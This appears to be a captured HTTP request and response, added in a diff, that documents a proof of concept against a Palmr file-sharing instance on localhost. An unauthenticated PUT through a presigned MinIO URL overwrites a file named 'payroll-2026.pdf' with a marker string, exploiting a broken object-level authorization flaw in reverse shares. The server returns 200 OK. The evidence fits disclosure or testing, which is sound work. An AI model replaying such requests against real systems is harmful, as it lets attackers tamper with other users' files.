@@ -1,0 +1,25 @@
+HttpRequestResponse{httpRequest=PUT /palmr-files/cmujl55ie0000qs0ovmyxqltb/1790499633225-6sb6yp-payroll-2026.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=palmr-minio-admin%2F20260927%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260927T090118Z&X-Amz-Expires=3600&X-Amz-Signature=312ad1200d3b8bacfdd3c7cae8d2e3641b3d05b574715a61af9fb8db50dee2b2&X-Amz-SignedHeaders=host&x-amz-checksum-crc32=AAAAAA%3D%3D&x-amz-sdk-checksum-algorithm=CRC32&x-id=PutObject HTTP/1.1
+Host: localhost:9379
+Content-Type: application/pdf
+Content-Length: 95
+Connection: close
+
+MALICIOUS CONTENT injected by an UNAUTHENTICATED attacker via reverse-share presigned-url BOLA
+, httpResponse=HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 0
+ETag: "f22d23ed721d782c019c7d3b926fba6f"
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: 9afb564a963e7d70df46c0bc1760490408e5ab2df6a871b27f9e108a588b6aa2
+X-Amz-Request-Id: 18D921F8B418AD06
+X-Content-Type-Options: nosniff
+X-Ratelimit-Limit: 2583
+X-Ratelimit-Remaining: 2583
+X-Xss-Protection: 1; mode=block
+Date: Sun, 27 Sep 2026 09:01:18 GMT
+Connection: close
+
+, messageAnnotations=Annotations{comment='', highlightColor=NONE}}
